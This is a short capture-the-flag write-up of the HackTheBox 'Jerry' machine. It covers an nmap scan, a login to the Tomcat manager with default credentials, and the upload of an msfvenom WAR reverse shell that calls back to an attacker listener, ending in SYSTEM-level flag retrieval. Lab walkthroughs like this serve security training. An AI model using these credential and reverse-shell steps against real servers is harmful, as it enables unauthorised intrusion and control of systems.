+++ 
title = "Jerry HTB Write up"
description = "Write up for the HTB machine 'Jerry'"
author = "greatmoves"
tags=["penetration testing", "nmap", "RCE", "Tomcat", "Apache", "web application security", "credentials", "default credentials", "reverse shell", "netcat", "privilege escalation", "Windows", "hackthebox", "easy"]
date = 2023-05-04
+++

# 1. Initial recon

## 1.1. nmap
`nmap -sC -sV 10.10.10.95 -Pn`

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
```

from the nmap scan we can navigate to `10.10.10.95:8080` clicking on the manager page we are prompted to enter some credentials
trying the usual
```
admin:admin
admin:password
...
```
we are met with a 403 page that contains some default credentials
```
tomcat:s3cret
```
surely enough those work when we are prompted to log in again

# 2. RCE

looking through the manager portal at `/manager/html` we can see that there is an option to upload WAR files. we can find a `msfvenom` reverse shell for the war file on [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#metasploit)

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.41 LPORT=80 -f war -o revshell.war
```

after uploading the file for the reverse shell, and running a netcat listener, we can navigate to `/revshell` on the web server to catch it

# 3. user and root!

a simple `whoami` in our rev shell reveals that we are already `nt authority\system` so let's just search for our flags

we can find them at `C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt` and simply running `type "2 for the price of 1.txt` in the flag directory will reveal both our user and root flags.